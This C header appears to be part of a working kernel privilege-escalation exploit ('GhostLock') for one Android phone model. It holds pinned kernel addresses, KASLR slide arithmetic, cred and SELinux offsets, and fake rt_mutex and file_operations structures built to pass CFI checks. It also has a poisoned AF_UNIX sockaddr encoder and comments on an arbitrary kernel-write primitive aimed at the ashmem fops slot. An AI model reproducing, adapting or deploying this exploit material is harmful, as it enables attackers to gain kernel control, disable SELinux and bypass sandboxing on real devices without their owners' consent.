/* ============================================================================
 * gl36_pseudo_page.h — GhostLock direct-reopen, cannon (Redmi Note 9 5G)
 * pseudo-world 4K page layout + poison sockaddr encoder — FINAL (ticket 36)
 *
 * Design baseline: research/35 §3.3 (page layout) / §3.4 (poison layout);
 * every constant pinned on THIS machine by Image disassembly or PMI oracle
 * calibration (ticket 36; anchors cited per section).
 *
 * Tier-2 probe usage:
 *   #define GL36_SLIDE 0x17B8000000ULL   // or pass at runtime via gl36_slide
 *   #include "gl36_pseudo_page.h"
 *
 * Runtime inputs (the ONLY three):
 *   gl36_slide      — kernel text slide (perf oracle, ticket 31: this boot
 *                     0x17B8000000; re-read per boot)
 *   gl36_page_base  — marker-page linear VA (PMI page oracle, ticket 36 task 1;
 *                     MUST satisfy the abstract-name constraint, see §8)
 *   gl36_init_task  — static VA below is slid automatically; no runtime input
 *
 * Discipline note: this header is DATA ONLY (no device interaction).
 * ==========================================================================*/
#ifndef GL36_PSEUDO_PAGE_H
#define GL36_PSEUDO_PAGE_H

#include <stdint.h>
#include <string.h>

/* ------------------------------------------------------------------ *
 * 0. Boot anchor: slide                                               *
 * ------------------------------------------------------------------ */
#ifndef GL36_SLIDE
#define GL36_SLIDE 0x17B8000000ULL        /* this boot (31/32/36, 3-run vote) */
#endif
#define GL36_SLID(static_va) ((uint64_t)(static_va) + GL36_SLIDE)

/* ------------------------------------------------------------------ *
 * 1. Memory geometry (36 §task6: kfree/free_pages/__put_page disasm)   *
 *    VA_BITS=39 -> PAGE_OFFSET=0xFFFFFFC000000000, VMEMMAP_START=      *
 *    PAGE_OFFSET - 1GB = 0xFFFFFFBF00000000 (kfree imm 0xffffffbf...)  *
 *    Linear base C is per-boot random but CANCELS in both directions:  *
 *    page = VMEMMAP_START + ((VA - PAGE_OFFSET) >> 12) * 0x40          *
 * ------------------------------------------------------------------ */
#define GL36_PAGE_OFFSET      0xFFFFFFC000000000ULL
#define GL36_VMEMMAP_START    0xFFFFFFBF00000000ULL
#define GL36_STRUCT_PAGE_SIZE 0x40           /* kfree lsl #6 (x2 anchors)   */
#define GL36_PAGE_COMPOUND_HEAD_OFF 0x20     /* kfree/[page+0x20] bit0 test */
#define GL36_PAGE_SLAB_CACHE_OFF   0x30      /* kfree: ldr x22,[x19,#48]    */
#define GL36_PAGE_REFCOUNT_OFF     0x1C      /* free_pages atomic loop       */
#define GL36_PAGE_MAPCOUNT_OFF     0x18
#define GL36_PAGE_FREELIST_OFF     0x10
#define GL36_PAGE_S_MEM_OFF        0x08
#define GL36_PAGE_FLAGS_PG_SLAB_BIT 9        /* kfree: tbz w8,#9 -> !PageSlab */

/* pure-VA vmemmap math: NO C needed (memstart cancels — 36 task 6) */
static inline uint64_t gl36_virt_to_page(uint64_t va)
{
	return GL36_VMEMMAP_START + (((va - GL36_PAGE_OFFSET) >> 12) << 6);
}
static inline uint64_t gl36_page_to_virt(uint64_t page)
{
	return GL36_PAGE_OFFSET + ((((page - GL36_VMEMMAP_START) / 0x40)) << 12);
}
/* linear-map domain window (C in [PAGE_OFFSET, +252GB], RAM ~7.4GB) */
#define GL36_PHYSMAP_LO 0xFFFFFFC000000000ULL
/* 37-r6 fix: the old HI (0xFFFFFFFFFF000000) admitted vmemmap struct-page
 * pointers (0xffffffbf.. / 0xfffffffe.. / 0xffffffff1..) into the candidate
 * histogram; their counts overwhelmed the true page base and the r5 run
 * poisoned fake_lock into the vmemmap array (KE at rb_erase+0x1c0, walk over
 * garbage page structs). True physmap on this device = [C, C + DRAM) with
 * C in a ~252GB window above PAGE_OFFSET; cap candidates at PAGE_OFFSET +
 * 260GB which excludes every vmemmap address. */
#define GL36_PHYSMAP_HI 0xFFFFFFFFFF000000ULL   /* full physmap band; the actual
                                                   * vmemmap span on 8GB DRAM is only
                                                   * [0xffffffbf00000000, +128MB] and
                                                   * is excluded separately below */

/* ------------------------------------------------------------------ *
 * 2. kmalloc caches (36 task 6: kmalloc_slab disasm)                   *
 *    kmalloc_caches[type][idx], row stride 0x70 (14 slots),            *
 *    idx = 32 - clz(size-1) for 192 < size <= 8192 (10 -> 1k,          *
 *    11 -> 2k); 4.14 memcg clones (memcg_kmem_get_cache) are NOT in    *
 *    this array — pipe_buffer under GFP_KERNEL_ACCOUNT may land in a   *
 *    per-memcg clone: identify via page->slab_cache scan instead       *
 *    (same pipe_scan_vmemmap logic as aresin pipe.c).                  *
 * ------------------------------------------------------------------ */
#define GL36_KMALLOC_CACHES_STATIC 0xFFFFFF8009FF5200ULL   /* adrp+0x200 @kmalloc_slab */
#define GL36_KMALLOC_CACHES        GL36_SLID(GL36_KMALLOC_CACHES_STATIC)
#define GL36_KMALLOC_ROW_STRIDE    0x70    /* type: 0=normal 1=reclaim 2=dma */
#define GL36_KMALLOC_IDX_1K        10
#define GL36_KMALLOC_IDX_2K        11
static inline uint64_t gl36_kmalloc_cache(int type, int idx)
{
	return GL36_KMALLOC_CACHES + (uint64_t)type * GL36_KMALLOC_ROW_STRIDE
	       + (uint64_t)idx * 8;
}

/* ------------------------------------------------------------------ *
 * 3. task_struct / cred / seccomp / selinux                            *
 *    (20/24/35 disasm; seccomp+selinux_state pinned this ticket)       *
 * ------------------------------------------------------------------ */
#define GL36_TASK_SIZE           0xE80    /* 35 */
#define GL36_TASK_TI_FLAGS_OFF   0x00     /* THREAD_INFO_IN_TASK; TIF_SECCOMP=11 */
#define GL36_TASK_CPU_OFF        0x5C     /* task_cpu, 35 §4.4 double-anchored */
#define GL36_TASK_ON_RQ_OFF      0x7C
#define GL36_TASK_USAGE_OFF      0x40     /* refcount */
#define GL36_TASK_PID_OFF        0x5C8
#define GL36_TASK_THREAD_GROUP_OFF 0x678  /* 41-r123 offprobe: list_head chain
                                             threading ALL group threads
                                             (leader first); for_each_thread
                                             = list_for_each_entry(t,
                                             &leader->thread_group,
                                             thread_group) on 4.14 */
#define GL36_TASK_TGID_OFF       0x5CC
#define GL36_TASK_TASKS_OFF      0x4C8    /* list_head */
#define GL36_TASK_REAL_CRED_OFF  0x788
#define GL36_TASK_CRED_OFF       0x790
#define GL36_TASK_PRIO_OFF       0x84     /* int */
#define GL36_TASK_NORMAL_PRIO_OFF 0x8C    /* int */
#define GL36_TASK_COMM_OFF       0x798    /* "swapper" double-proof (35) */
#define GL36_TASK_SECCOMP_OFF    0x838    /* 36: __secure_computing ldr w9,[cur,#2104] */
#define GL36_TASK_PI_LOCK_OFF    0x85C
#define GL36_TASK_PI_WAITERS_OFF 0x868    /* rb_root_cached (root+0x00,leftmost+0x08) */
#define GL36_TASK_PI_TOP_TASK_OFF 0x878
#define GL36_TASK_PI_BLOCKED_ON_OFF 0x880
#define GL36_TASK_TURBO_OFF      0xA98    /* is_turbo_task inline (35 §4.4) */
#define GL36_TASK_INHERIT_TYPES_OFF 0xA9C
#define GL36_TIF_SECCOMP_BIT     11       /* clear with seccomp.mode: a mode!=0
                                             * with TIF_SECCOMP set is fine, mode==0
                                             * with TIF set hits brk #0x800 */

#define GL36_CRED_SIZE           0xA8
#define GL36_CRED_UID_OFF        0x04
#define GL36_CRED_CAPS_OFF       0x30
#define GL36_CRED_SECURITY_OFF   0x78     /* user@0x80 corroborates (35) */
#define GL36_CRED_USER_OFF       0x80

#define GL36_INIT_TASK_STATIC    0xFFFFFF800A6C6780ULL   /* 35: comm "swapper" */
#define GL36_INIT_TASK           GL36_SLID(GL36_INIT_TASK_STATIC)
#define GL36_INIT_CRED_STATIC    0xFFFFFF800A6D1F10ULL   /* 35 */
#define GL36_INIT_CRED           GL36_SLID(GL36_INIT_CRED_STATIC)

/* selinux (36 task 7: enforcing_setup store + 234 adrp+add#0xd90 sites) */
#define GL36_SELINUX_STATE_STATIC 0xFFFFFF800AB47D90ULL  /* == KernelSU doc value */
#define GL36_SELINUX_STATE       GL36_SLID(GL36_SELINUX_STATE_STATIC)
#define GL36_SELINUX_ENFORCING_OFF 0x20   /* u32; VA slide+0xFFFFFF800AB47DB0 */

/* ------------------------------------------------------------------ *
 * 4. rt_mutex / rt_mutex_waiter (20 §2, 29 §3, 35 §1 cross-check)      *
 * ------------------------------------------------------------------ */
#define GL36_RTMUTEX_WAIT_LOCK_OFF  0x00  /* raw spinlock */
#define GL36_RTMUTEX_WAITERS_OFF    0x08  /* rb_root_cached: root@+0, leftmost@+8 */
#define GL36_RTMUTEX_OWNER_OFF      0x18  /* owner|flags */

#define GL36_WAITER_TREE_PC_OFF     0x00  /* rb_node.__rb_parent_color */
#define GL36_WAITER_TREE_RIGHT_OFF  0x08
#define GL36_WAITER_TREE_LEFT_OFF   0x10
#define GL36_WAITER_PI_PC_OFF       0x18  /* 4.14 pi_tree @0x18 (aresin 0x28 = 6.x,
                                              * its route-killer; [11] disasm
                                              * pi_task=[leftmost+0x18], 35) */
#define GL36_WAITER_PI_RIGHT_OFF    0x20
#define GL36_WAITER_PI_LEFT_OFF     0x28
#define GL36_WAITER_TASK_OFF        0x30
#define GL36_WAITER_LOCK_OFF        0x38
#define GL36_WAITER_PRIO_OFF        0x40  /* int */
#define GL36_WAITER_DEADLINE_OFF    0x48  /* s64 (fair-class poison: outside
                                           * sockaddr window, not delivered) */

/* ------------------------------------------------------------------ *
 * 5. file / file_operations — RANDSTRUCT OFF in this build             *
 *    (source carries __randomize_layout on both; 36 disasm proof that  *
 *    layout is stock: f_op@0x28 (x5 sites: vfs_read/__vfs_read/        *
 *    do_dentry_open/vfs_ioctl/__fput/compat_sys_ioctl), f_pos_lock@    *
 *    0x48 + f_pos@0x68 (SyS_read), f_flags@0x40, f_inode@0x20;         *
 *    fops slots: read@0x10/read_iter@0x20 (__vfs_read), write@0x18     *
 *    (__vfs_write), llseek@0x08 (vfs_llseek), unlocked_ioctl@0x48      *
 *    (vfs_ioctl), compat_ioctl@0x50 (compat_sys_ioctl), open@0x60      *
 *    (do_dentry_open), release@0x70 (__fput))                          *
 * ------------------------------------------------------------------ */
#define GL36_FILE_SIZE           0x100    /* filp stride (36 oracle: file* values
                                             * 0x100-aligned, x19@vfs_read) */
#define GL36_FILE_F_PATH_OFF     0x10     /* mnt@0x10 dentry@0x18 */
#define GL36_FILE_F_INODE_OFF    0x20
#define GL36_FILE_F_OP_OFF       0x28     /* backup write target: file+0x28 */
#define GL36_FILE_F_FLAGS_OFF    0x40
#define GL36_FILE_F_POS_LOCK_OFF 0x48
#define GL36_FILE_F_POS_OFF      0x68
#define GL36_FILE_PRIVATE_DATA_OFF 0xD0
#define GL36_FILE_F_MAPPING_OFF  0xF0

#define GL36_FOPS_OWNER_OFF      0x00
#define GL36_FOPS_LLSEEK_OFF     0x08
#define GL36_FOPS_READ_OFF       0x10
#define GL36_FOPS_WRITE_OFF      0x18
#define GL36_FOPS_READ_ITER_OFF  0x20
#define GL36_FOPS_WRITE_ITER_OFF 0x28
#define GL36_FOPS_ITERATE_OFF    0x30
#define GL36_FOPS_ITERATE_SHARED_OFF 0x38
#define GL36_FOPS_POLL_OFF       0x40
#define GL36_FOPS_IOCTL_OFF      0x48
#define GL36_FOPS_COMPAT_IOCTL_OFF 0x50
#define GL36_FOPS_MMAP_OFF       0x58    /* pinned by elimination (neighbors
                                          * 0x50/0x60 disasm-verified) */
#define GL36_FOPS_OPEN_OFF       0x60
#define GL36_FOPS_FLUSH_OFF      0x68
#define GL36_FOPS_RELEASE_OFF    0x70
#define GL36_FOPS_SPLICE_READ_OFF 0xB8
#define GL36_FOPS_SHOW_FDINFO_OFF 0xD0
#define GL36_FOPS_SIZE           0xF8

/* fops function static VAs (RELA table; all real functions, CFI-clean) */
#define GL36_NOOP_LLSEEK_STATIC    0xFFFFFF800842B0E4ULL
#define GL36_CONFIGFS_READ_FILE_STATIC  0xFFFFFF80084E6628ULL
#define GL36_CONFIGFS_WRITE_FILE_STATIC 0xFFFFFF80084E6810ULL
/* 37-r17: bin-write primitive (kallsyms CFI-suffixed symbol; any-write engine:
 * plant {bin_buffer=TARGET, bin_buffer_size=BIG} -> pwrite copies into TARGET
 * without entering the grow branch (cb_max_size=0 skips the EFBIG check)) */
#define GL36_CONFIGFS_WRITE_BIN_FILE_STATIC 0xFFFFFF80084E6C90ULL
#define GL36_ASHMEM_IOCTL_STATIC  0xFFFFFF8008141DF8ULL
#define GL36_ASHMEM_COMPAT_IOCTL_STATIC 0xFFFFFF80081426D4ULL
#define GL36_ASHMEM_MMAP_STATIC   0xFFFFFF8008142720ULL
#define GL36_ASHMEM_OPEN_STATIC   0xFFFFFF8008142890ULL
#define GL36_ASHMEM_RELEASE_STATIC 0xFFFFFF8008142910ULL
#define GL36_ASHMEM_READ_ITER_STATIC 0xFFFFFF8008141D44ULL

/* 37-r19: CFI jump-table trampolines (KE14 proof: misc_open+0x118..0x12c
 * ror/cmp #0x423 range-checks every fops slot against its call-site window;
 * real-function VAs FAIL, only jt entries pass). Filled by the jt scan. */
#define GL36_SLIDE_BASE 0xFFFFFF8008080000ULL   /* canonical VA -> static addend */
#define GL36_JT_ASHMEM_OPEN     0xFFFFFF80094379E0ULL  /* misc_open window #71 */
#define GL36_JT_ASHMEM_RELEASE  0xFFFFFF80094379E4ULL  /* misc_open window #72 */
/* jt scan subagent (7/7 window-verified, b-decode + kallsyms cross-checked):
 * windows: ioctl/compat [0x13b4e9c,0x109) mmap [0x13af708,0x2e)
 *          read_iter [0x13b1310,0x2c) read [0x13b4394,0xb5)
 *          write [0x13b0b30,0x1ec) llseek [0x13a9af0,0x21) */
#define GL36_JT_ASHMEM_IOCTL        0xFFFFFF8009434ED4ULL
#define GL36_JT_ASHMEM_COMPAT_IOCTL 0xFFFFFF8009434ED8ULL
#define GL36_JT_ASHMEM_MMAP         0xFFFFFF800942F710ULL
#define GL36_JT_ASHMEM_READ_ITER    0xFFFFFF800943131CULL
#define GL36_JT_CONFIGFS_READ_FILE  0xFFFFFF8009434590ULL
#define GL36_JT_CONFIGFS_WRITE_BIN  0xFFFFFF8009430F2CULL
#define GL36_JT_NOOP_LLSEEK         0xFFFFFF8009429B00ULL

/* 37-r17: staging-side ASHMEM constants (kernel 4.14 staging uapi; verified
 * against ashmem_ioctl disasm by subagent: __ASHMEMIOC=0x77, NAME_LEN=256) */
#define GL36_ASHMEM_IOC        0x77ULL
#define GL36_ASHMEM_SET_NAME   0x41007701ULL  /* _IOW(0x77,1,char[256]) */
#define GL36_ASHMEM_NAME_PREFIX_LEN 11        /* "dev/ashmem/" prefix kept by
                                               * ashmem_set_name (strcpy to
                                               * asma->name+11, disasm +0x20c) */

/* ------------------------------------------------------------------ *
 * 6. Fake-world 4K page layout (35 §3.3, field windows disjoint)       *
 * ------------------------------------------------------------------ */
#define GL36_FAKE_LOCK_OFF   0x100
#define GL36_W0_OFF          0x200
#define GL36_FAKE_TASK_OFF   0x400   /* 37 overflow fix: 0x800+0xAA0>4K */
#define GL36_FAKE_FOPS_OFF   0xE00   /* 37 overflow fix (after task span 0xEA0) */
#define GL36_SCRATCH_OFF     0xF00

/* fake_lock (rt_mutex at page+0x100):
 *   wait_lock@0 = 0; waiters.root@+8 = &W0.tree (page+0x200);
 *   waiters.leftmost@+0x10 = &W0.pi_tree? NO — leftmost = &W0.tree?
 *   35 §3.3: waiters={root=fake_w0, leftmost=fake_w0} where fake_w0 is
 *   the WAITER pointer whose tree entry is the linked node; rb_root_cached
 *   links &waiter->tree (W0+0x00). owner@+0x18 = fake_task|1.
 * NOTE: root/leftmost must be the address of W0's TREE node (W0+0x00),
 * not the waiter base — encode exactly: root = leftmost = page+0x200. */
#define GL36_FAKE_LOCK(pc)  ((pc) + GL36_FAKE_LOCK_OFF)

/* W0 (fake waiter at page+0x200): tree@0x00 {pc=1,0,0};
 * pi_tree@0x18 {pc=FAKE_FOPS_va, rb_right=TARGET, rb_left=0}  ★write vehicle
 * prio@0x40=130; task@0x30/lock@0x38 arbitrary (chain never reads)      */
#define GL36_W0_PI_PC_VAL(page)   ((page) + GL36_FAKE_FOPS_OFF)   /* FAKE_FOPS */
#define GL36_W0_PI_RIGHT_VAL      0 /* replaced by TARGET at build time */

/* fake_task at page+0x800 — see §3 offsets; required field set (35 §4.4):
 *  [+0x00]=0 (ti.flags), [+0x5C]=0 (cpu), [+0x7C]=0 (on_rq), usage=0x100,
 *  prio=120, normal_prio=120, pi_lock=0, pi_waiters EMPTY (root=leftmost=0),
 *  pi_top_task=init_task, pi_blocked_on=0, turbo=0, inherit_types=0.
 *  setprio() early-exit is a HARD invariant (§4.4: any deviation ->
 *  full __task_rq_lock path on a fake task -> KE). */

/* fake_fops at page+0xB00 — all real functions + slide (CFI-clean) */
struct gl36_fops {
	uint64_t owner;        /* 0x00 = NULL */
	uint64_t llseek;       /* 0x08 = noop_llseek */
	uint64_t read;         /* 0x10 = configfs_read_file */
	uint64_t write;        /* 0x18 = configfs_write_file */
	uint64_t read_iter;    /* 0x20 = ashmem_read_iter */
	uint64_t write_iter;   /* 0x28 = 0 */
	uint64_t iterate;      /* 0x30 = 0 */
	uint64_t iterate_shared; /* 0x38 = 0 */
	uint64_t poll;         /* 0x40 = 0 */
	uint64_t unlocked_ioctl; /* 0x48 = ashmem_ioctl */
	uint64_t compat_ioctl; /* 0x50 = compat_ashmem_ioctl */
	uint64_t mmap;         /* 0x58 = ashmem_mmap */
	uint64_t open;         /* 0x60 = ashmem_open */
	uint64_t flush;        /* 0x68 = 0 */
	uint64_t release;      /* 0x70 = ashmem_release */
	/* rest zero through 0xF8; llseek slot collateral note: [11a] erase
	 * writes TARGET into [fake_fops+0x08] (rb __rb_change_child else-branch)
	 * — post-write repair via configfs write primitive, per 35 §4.1 [11a] */
};

/* 37-r7 fix (KE4 decisive evidence): every slot used the COMPILE-TIME
 * GL36_SLIDE (stale 0x17B8000000 from the 31-boot) instead of the runtime
 * slide — r4 and r5 crashed at the IDENTICAL FAR (0xffffff97c04e6628 =
 * configfs_read_file + 0x17b8000000) on different boots. Take the runtime
 * slide as an argument; the compile-time default is only a fallback. */
static uint64_t gl36_rt_slide = GL36_SLIDE;   /* set by the probe after pin */

static inline void gl36_fill_fops(struct gl36_fops *f)
{
	memset(f, 0, sizeof(*f));
	f->owner = 0;
	/* 37-r19: every slot = CFI jt trampoline (KE14: range-check against
	 * call-site window; real-function VAs are rejected by design).
	 * r19b: GL36_SLID semantics require the FULL canonical VA as addend
	 * (KE15: `jt - SLIDE_BASE` stripped the 0xffffff80 prefix; FAR =
	 * slide+jt_off bitwise). The real fops table stores full-VA addends,
	 * jt slots are no different. */
	f->llseek = gl36_rt_slide + GL36_JT_NOOP_LLSEEK;
	f->read = gl36_rt_slide + GL36_JT_CONFIGFS_READ_FILE;
	f->write = gl36_rt_slide + GL36_JT_CONFIGFS_WRITE_BIN;
	f->read_iter = gl36_rt_slide + GL36_JT_ASHMEM_READ_ITER;
	f->unlocked_ioctl = gl36_rt_slide + GL36_JT_ASHMEM_IOCTL;
	f->compat_ioctl = gl36_rt_slide + GL36_JT_ASHMEM_COMPAT_IOCTL;
	f->mmap = gl36_rt_slide + GL36_JT_ASHMEM_MMAP;
	f->open = gl36_rt_slide + GL36_JT_ASHMEM_OPEN;
	f->release = gl36_rt_slide + GL36_JT_ASHMEM_RELEASE;
}

/* ------------------------------------------------------------------ *
 * 7. Write target: ashmem miscdevice fops slot (canonical VA)          *
 *    miscdevice { minor@0, name@8, fops@0x10 } (source, no randstruct; *
 *    node /dev/ashmem* dev_t 10,104 — runtime-assigned minor; the      *
 *    struct address is what matters). Shell cannot open the primary    *
 *    node (SELinux ashmem_device); the libcutils alias node opens —    *
 *    same miscdevice, same fops slot (36 task 4).                      *
 * ------------------------------------------------------------------ */
#define GL36_ASHMEM_MISC_STATIC  0xFFFFFF800A6BD450ULL  /* 35: minor=0xff init
                                                          * + double cache names */
#define GL36_ASHMEM_MISC         GL36_SLID(GL36_ASHMEM_MISC_STATIC)
#define GL36_TARGET              (GL36_ASHMEM_MISC + 0x10)  /* misc->fops slot:
                                                          * slide+0xFFFFFF800A6BD460 */

/* configfs_buffer (MiCode fs/configfs/file.c; aresin CFG_* offsets match) */
#define GL36_CFGBUF_COUNT_OFF        0x00
#define GL36_CFGBUF_POS_OFF          0x08
#define GL36_CFGBUF_PAGE_OFF         0x10
#define GL36_CFGBUF_OPS_OFF          0x18
#define GL36_CFGBUF_MUTEX_OFF        0x20   /* 32B */
#define GL36_CFGBUF_NEEDS_READ_FILL_OFF 0x40
#define GL36_CFGBUF_BIN_BUFFER_OFF   0x48
#define GL36_CFGBUF_BIN_BUFFER_SIZE_OFF 0x50
#define GL36_CFGBUF_CB_MAX_SIZE_OFF  0x54

/* pipe_buffer (aresin stride 0x28 = source layout) */
#define GL36_PIPE_BUFFER_SIZE  0x28
#define GL36_PIPE_BUF_PAGE_OFF    0x00
#define GL36_PIPE_BUF_OFFSET_OFF  0x08  /* u32 */
#define GL36_PIPE_BUF_LEN_OFF     0x0C  /* u32 */
#define GL36_PIPE_BUF_OPS_OFF     0x10
#define GL36_PIPE_BUF_FLAGS_OFF   0x18  /* u32 */
#define GL36_PIPE_BUF_PRIVATE_OFF 0x20
#define GL36_PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ------------------------------------------------------------------ *
 * 8. Poison sockaddr encoder (35 §3.4 + 36 constraint fix)             *
 *                                                                      *
 * Carrier: 29-r7 blocking sendmsg — AF_UNIX DGRAM, THREE sockets       *
 * (snd/rcv/fill); rcv bound to the POISON 48-byte abstract name; fill  *
 * floods rcv's queue (MSG_DONTWAIT x N until EAGAIN); victim sendmsg   *
 * (syscall 211, skfd, &msghdr, 0) blocks in unix_wait_for_peer with    *
 * the copied sockaddr alive at [W+0x18, W+0x48).                       *
 *                                                                      *
 * Slot map (48B window == rt_mutex_waiter tail):                       *
 *   bytes 00-07 -> W+0x18 pi_tree.pc    (family rides low 16 bits)     *
 *   bytes 08-15 -> W+0x20 pi_tree.rb_right = 0                          *
 *   bytes 16-23 -> W+0x28 pi_tree.rb_left  = 0                          *
 *   bytes 24-31 -> W+0x30 waiter->task    = init_task (slid)            *
 *   bytes 32-39 -> W+0x38 waiter->lock    = fake_lock (page+0x100)      *
 *   bytes 40-43 -> W+0x40 waiter->prio    = 3 (sched attr conflict)     *
 *   bytes 44-47 -> W+0x44 pad             = 0 (deadline@0x48 outside)   *
 *                                                                      *
 * ★ CONSTRAINTS (completed in 36; 35 §3.4 missed both):                 *
 *   1. sun_family must read 0x0001 (LE bytes {01,00}) -> pi_pc bits     *
 *      8..15 must be 0x00, i.e. page_base bits 12..15 masked.           *
 *   2. unix_find_other() takes the abstract branch only when            *
 *      sun_path[0] == 0 -> pi_pc bits 16..23 must be 0x00.              *
 *   For the BLOCKING carrier the rcv socket must be bound to the same   *
 *   name, so both constraints are hard. pi_pc's pre-insertion value is  *
 *   NEVER consumed ([11b] rb_link_node overwrites W+0x18 before any     *
 *   read — empty-tree insertion guaranteed by the §3.3 pi_waiters=0     *
 *   invariant + [11a] erase; 35 §4.1/§4.3 walk tables; path (b) is      *
 *   pure-read), therefore bits 8..23 can be MASKED to zero:            *
 *       pi_pc = (page_base & ~0x00FFFF00ULL) | 1                        *
 *   — family = 0x0001 (page 4K-aligned => byte0 = 0x01), abstract      *
 *   name legal, NO page-selection constraint at all. If a stricter      *
 *   carrier form ever READS pi_pc pre-insertion, fall back to          *
 *   selecting a marker page with (page_base & 0x00FFFF000) == 0         *
 *   (1/4096 of pages; spray memfds and oracle each).                    *
 *                                                                      *
 * iov window [W-0x68, W+0x18) = 8 iovecs, all {0,0,0} (tree_entry      *
 * zeros — 29 r6/r7 form); msg_iovlen/flags/control = 0.                *
 * ------------------------------------------------------------------ */
#define GL36_POISON_PRIO      3      /* != victim prio 120/139 -> chain walk */
#define GL36_POISON_SOCKADDR_LEN 48  /* > offsetof(sun_path)=2, <= 110       */

static inline void gl36_encode_poison_sockaddr(uint8_t name[GL36_POISON_SOCKADDR_LEN],
					       uint64_t page_base)
{
	uint64_t pi_pc  = (page_base & ~0x00FFFF00ULL) | 1;  /* family=0x0001,
							      * bytes 1..2 = 0 */
	uint64_t pi_r   = 0;
	uint64_t pi_l   = 0;
	uint64_t w_task = GL36_INIT_TASK;
	uint64_t w_lock = page_base + GL36_FAKE_LOCK_OFF;
	uint32_t prio   = GL36_POISON_PRIO;
	uint32_t pad    = 0;
	memcpy(name +  0, &pi_pc,  8);
	memcpy(name +  8, &pi_r,   8);
	memcpy(name + 16, &pi_l,   8);
	memcpy(name + 24, &w_task, 8);
	memcpy(name + 32, &w_lock, 8);
	memcpy(name + 40, &prio,   4);
	memcpy(name + 44, &pad,    4);
	/* name[0..1] = AF_UNIX (0x0001 LE) — bind rcv with THIS 48B sockaddr,
	 * fill its queue, then victim sendmsg's msg_name = same 48B. */

	/* static asserts on the geometry the encoder silently relies on */
	(void)sizeof(char[(GL36_WAITER_PI_PC_OFF     == 0x18) ? 1 : -1]);
	(void)sizeof(char[(GL36_WAITER_TASK_OFF      == 0x30) ? 1 : -1]);
	(void)sizeof(char[(GL36_WAITER_LOCK_OFF      == 0x38) ? 1 : -1]);
	(void)sizeof(char[(GL36_WAITER_PRIO_OFF      == 0x40) ? 1 : -1]);
}

/* ------------------------------------------------------------------ *
 * 9. PMI page-oracle readout rule (36 task 1 calibration)              *
 *                                                                      *
 * The marker page is NOT reliably the top physmap page-base by count   *
 * (shmem inode/mapping slab page often wins: fixed offsets, e.g.       *
 * +0xb80/+0x700, 2-3 distinct offsets). Identify by the TRIPLE check:  *
 *   (a) page shows MANY distinct in-page offsets (256 across the page  *
 *       — copy-loop walking x1),                       ~n>1000/200k reads
 *   (b) the EXACT page-base value appears as a register value (kmap    *
 *       result, x20-class),                                            *
 *   (c) gl36_virt_to_page(P) appears in the vmemmap-domain register    *
 *       values (struct page* held during copy, x26-class).             *
 * Only (c) is decisive; (a)+(b) corroborate.                           *
 * Density (period 4096, cpu-cycles, exclude_user=1): >= 2 samples per  *
 * 100 preads; >= 1.1 samples CONTAINING the marker page per 100 preads *
 * (36: 200k reads -> 7428 samples, 2319 with marker page).             *
 * ------------------------------------------------------------------ */

#endif /* GL36_PSEUDO_PAGE_H */
